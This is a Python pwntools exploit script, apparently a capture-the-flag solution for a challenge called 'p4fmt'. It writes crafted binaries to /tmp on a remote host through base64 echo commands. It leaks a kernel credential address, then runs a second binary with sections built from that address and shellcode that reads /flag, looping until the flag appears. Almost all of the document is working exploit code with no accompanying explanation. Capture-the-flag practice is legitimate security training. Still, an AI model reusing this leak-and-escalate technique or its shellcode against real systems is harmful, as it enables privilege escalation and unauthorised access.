#!/usr/bin/env python
from pwn import *
import base64
import re

# p4{4r3_y0U_4_81n4ry_N1njA?}

context.arch = 'amd64'
host , port = 'p4fmt.zajebistyc.tf' , 30002

def gen_p4_binary( version = 0 , arg = 1 , section_header_offset = 0x18 , sections_len = 0 , entry = 0 , sections = [] , code = '' ):
    b = 'P4' # MAGIC
    b += p8( version ) + p8( arg )
    b += p32( sections_len ) + p64( section_header_offset ) + p64( entry )
    b += ''.join( flat(s) for s in sections )
    if code:
        b = b.ljust( entry & 0xfff , '\0' )
        b += code
    return b

def sp( cmd ):
    y.sendlineafter( '$' , cmd )

while True:
    y = remote( host , port )

    p4 = gen_p4_binary( section_header_offset = 0x90 , sections_len = 1 )
    sp( "echo %s | base64 -d > /tmp/leak" % ( base64.b64encode( p4 ) ) )
    sp( 'chmod +x /tmp/leak && cd /tmp' )

    while True:
        sp( './leak' )
        y.recvuntil( 'length=' )
        cred = int( y.recvuntil( ',' )[:-1] , 16 )
        success( 'cred -> %s' % hex( cred ) )

        secs = [
            [ cred | 8 + 0x10 , 0x30 , 0 ],
            [ 0x7000000 | 7 , 0x1000 , 0 ],
        ]

        code = asm( shellcraft.pushstr('/flag') + shellcraft.open('rsp',0,0) + shellcraft.read( 'rax' , 'rsp' , 0x70 ) + shellcraft.write( 1 , 'rsp' , 0x70 ))
        p4 = gen_p4_binary( sections = secs , sections_len = len( secs ) + 4  , entry = 0x7000090 , code = code )
        sp( "echo %s | base64 -d > /tmp/pwn && chmod +x /tmp/pwn" % ( base64.b64encode( p4 ) ) )
        sp( './pwn' )
        sp( './pwn' )
        o = y.recvuntil( 'Segmentation fault' , timeout = 1.6 )

        if 'p4{' in o:
            print o
            y.interactive()
        elif 'Segmentation fault' not in o:
            y.close()
            break
